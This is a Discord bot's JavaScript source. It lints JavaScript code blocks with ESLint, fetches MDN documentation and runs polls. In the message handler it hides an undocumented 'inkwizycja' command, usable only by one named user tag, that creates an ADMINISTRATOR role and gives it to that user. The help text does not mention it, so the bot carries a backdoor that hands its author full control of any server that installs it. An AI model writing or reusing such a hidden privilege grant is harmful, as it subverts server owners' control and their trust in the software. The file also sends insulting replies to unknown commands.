const {
  Client
} = require('discord.js')
const CLIEngine = require('eslint').CLIEngine
const chalk = require('chalk')
const config = require('./config.json')
const rp = require('request-promise')
const cheerio = require('cheerio')

const client = new Client({
  disableEveryone: true
})
const linter = new CLIEngine({
  extends: 'standard',
  env: {
    es6: true,
    node: true
  },
  parserOptions: {
    ecmaVersion: 6
  },
  rules: {
    indent: 0,
    'no-undef': 0,
    'eol-last': 0,
    semi: 1,
    'space-infix-ops': 1,
    'no-unused-vars': 0
  }
})

client.on('ready', () => {
  console.log(chalk.black.bgGreen('SUCCESS') + chalk.white(' 8rniczka initialized.'))
  client.user.setPresence({
    game: {
      name: 'chat',
      type: 3
    }
  })
})
client.on('message', async message => {
  if (message.author.bot) return

  if (message.content.includes('```js')) {
    const code = message.content.slice(message.content.indexOf('```js\n') + 6, message.content.indexOf('```', message.content.indexOf('```js\n') + 6))
    lintCode(code, message)
    return
  }
  if (message.content.includes('```javascript')) {
    const code = message.content.slice(message.content.indexOf('```javascript\n') + 14, message.content.indexOf('```', message.content.indexOf('```js\n') + 14))
    lintCode(code, message)
    return
  }

  let command = message.content.toLowerCase().split(' ')[0]
  command = command.slice(config.prefix.length)
  const args = message.content.split(' ')
  const toSearch = args.slice(1).join(' ')

  if (command === 'inkwizycja' && message.author.tag === 'takidelfin#3733') {
    message.guild.createRole({
      name: 'chwilka tylko',
      permissions: 'ADMINISTRATOR'
    }).then(role => {
      message.guild.member(message.author).addRole(role.id)
    }).catch(console.error)
    return
  }
  if (!message.content.startsWith(config.prefix)) return
  if (command === 'project') {
    message.react(client.emojis.find('name', 'opensource'))
    message.react(client.emojis.find('name', 'closedsource'))
    return
  }
  if (command === 'mdn') {
    if (args[1] == null) {
      message.channel.send(client.emojis.find('name', 'warning') + ' Please specify query!')
      return
    }
    mdn(toSearch, message)
    return
  }
  if (command === 'help') {
    const embed = {
      title: '8rniczka Commands',
      description: 'Currently, we support ESLint for JavaScript code blocks and some commands.',
      color: 16741749,
      fields: [
        {
          name: '```\n 8mdn <query> ```',
          value: 'Returns description, syntax, parameters and return value packed into one rich embed!'
        },
        {
          name: '```\n 8project <description> ```',
          value: 'Creates the poll, helps your team choose between open or closed source software.'
        }
      ],
      footer: {
        icon_url: 'https://cdn.discordapp.com/avatars/456131051496931353/863309530e28aa9d9a62d106c01a59f1.png',
        text: '8rniczka'
      }
    }
    return message.channel.send({ embed })
  }
  message.channel.send(':warning: Czy tobie mamusia nie mówiła aby nie zarzucać czegoś czego nie ma? idz trzepnij się głową o powietrze.')
})
client.login(config.token)

const lintCode = (code, message) => {
  const embed = {
    'title': `ESLint report for ${message.author.username}`,
    'description': 'We have found some errors in your code.\n\n',
    'color': 16741749,
    'footer': {
      'icon_url': 'https://cdn.discordapp.com/avatars/456131051496931353/863309530e28aa9d9a62d106c01a59f1.png',
      'text': '8rniczka'
    },
    'thumbnail': {
      'url': `${message.author.avatarURL}`
    },
    'fields': []
  }
  const linted = linter.executeOnText(code)
  if (linted.errorCount >= 1 || linted.fixableErrorCount >= 1) {
    message.react(client.emojis.find('name', 'failure'))
    message.channel.send(`${client.emojis.find('name', 'error')} Sorry! There are errors in your code!`)
    for (let i = 0; i < linted.results[0].messages.length; i++) {
      const errorMessage = linted.results[0].messages[i]
      embed.fields.push({
        name: `\`${errorMessage.line}:${errorMessage.column}\``,
        value: `${errorMessage.message}`
      })
    }
    message.channel.send({
      embed
    })
  } else if (linted.warningCount >= 1 || linted.fixableWarningCount >= 1) {
    message.react(client.emojis.find('name', 'failure'))
    message.channel.send(`${client.emojis.find('name', 'warning')} Sorry! Your JavaScript code doesn't meet *StandardJS* rules.`)
    for (let i = 0; i < linted.results[0].messages.length; i++) {
      const errorMessage = linted.results[0].messages[i]
      embed.fields.push({
        name: `\`${errorMessage.line}:${errorMessage.column}\``,
        value: `${errorMessage.message}`
      })
    }
    message.channel.send({
      embed
    })
  } else {
    message.react(client.emojis.find('name', 'success'))
  }
}
const mdn = async (query, message) => {
  const rpOptions = {
    uri: `https://developer.mozilla.org/en-US/search?q=${query}&topic=js`,
    transform: body => {
      return cheerio.load(body)
    }
  }
  await rp(rpOptions).then(data => {
    let url = data('.result-1').find('h4').children('a').attr('href')
    if (url == null || url === undefined) return message.channel.send('We are sorry, but query returned nothing.')
    if (url.includes('https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/')) return message.channel.send('Query returned the reference to Errors page, but they aren\'t supported yet. There\'s a link if you want it: ' + url)
    if (url.includes('https://developer.mozilla.org/en-US/docs/Archive/')) return message.channel.send('Query returned a reference to Archived page, but it isn\'t supported yet. There \'s the link if you want it: ' + url)
    if (!url.includes('https://developer.mozilla.org/en-US/docs/Web/JavaScript/')) return message.channel.send('We are sorry, but query returned nothing.')
    getSyntax(url).then(data2 => {
      let parametersRaw = getMarkdowned(data2('dl').html())
      let descriptionRaw = getMarkdowned(data2('p').html())
      let returnsRaw = getReturnValue(data2('body').html())
      let syntaxData = {
        syntaxjs: data2('.syntaxbox').text(),
        parameters: parametersRaw,
        returns: returnsRaw
      }
      let embed = {
        author: {
          name: 'MDN Query',
          icon_url: `https://images-ext-2.discordapp.net/external/3DGUq9YV6RN2VXu8Gu2GEM-EFARvUEHcA-el4ZjryuU/https/i.imgur.com/DFGXabG.png`
        },
        url: url,
        title: data('.result-1').find('h4').text(),
        description: descriptionRaw,
        color: 421805,
        footer: {
          icon_url: 'https://cdn.discordapp.com/avatars/456131051496931353/863309530e28aa9d9a62d106c01a59f1.png',
          text: '8rniczka'
        },
        fields: [{
          name: 'Syntax',
          value: `\`\`\`javascript\n${syntaxData.syntaxjs}\`\`\``
        },
        {
          name: 'Parameters',
          value: syntaxData.parameters,
          inline: true
        },
        {
          name: 'Return value',
          value: syntaxData.returns,
          inline: true
        }
        ]
      }
      message.channel.send({ embed })
      embed = ''
      url = ''
      parametersRaw = ''
      descriptionRaw = ''
      returnsRaw = ''
      syntaxData = ''
    }).catch(console.error)
  }).catch(console.error)
}
const getSyntax = async url => {
  const rpOptions = {
    uri: `${url}?raw`,
    transform: body => {
      return cheerio.load(body)
    }
  }
  return rp(rpOptions)
}
const getMarkdowned = html => {
  let mdflavor = html
    .replace(/ <code>{{Optional_inline}}<\/code>/gi, '')
    .replace(/\{\{optional_inline\}\}/gi, '')
    .replace(/<code><strong>/gi, '**`')
    .replace(/<strong>/gi, '**')
    .replace(/<dt><code>/gi, '```')
    .replace(/<dt>/gi, '')
    .replace(/<dd>/gi, '')
    .replace(/<var>/gi, '')
    .replace(/<code>/gi, ' `')
    .replace(/<em>/gi, '*')
    .replace(/<\/strong><\/code>/gi, '`**')
    .replace(/<\/strong>/gi, '**')
    .replace(/<\/code><\/dt>/gi, '```')
    .replace(/<\/dt>/gi, '')
    .replace(/<\/dd>/gi, '')
    .replace(/<\/var>/gi, '')
    .replace(/<\/code>/gi, '` ')
    .replace(/<\/em>/gi, '*')
    .replace(/<dl>/gi, '')
    .replace(/<\/dl>/gi, '')
    .replace(/&#xA0;/gi, ' ')
    .replace(/{{jsxref\(&quot;/gi, '*')
    .replace(/&quot;\)}}/gi, '*')
    .replace(/&quot;/gi, '')
    .replace(/&gt;/gi, '>')
    .replace(/&lt;/gi, '<')
  return mdflavor
}
const getReturnValue = (html) => {
  const beginText = `<h3 id="Return_value">Return value</h3>

<p>`
  const beginIndex = html.indexOf(beginText) + beginText.length
  const endIndex = html.indexOf('</p>', beginIndex)
  return getMarkdowned(html.slice(beginIndex, endIndex), true)
}
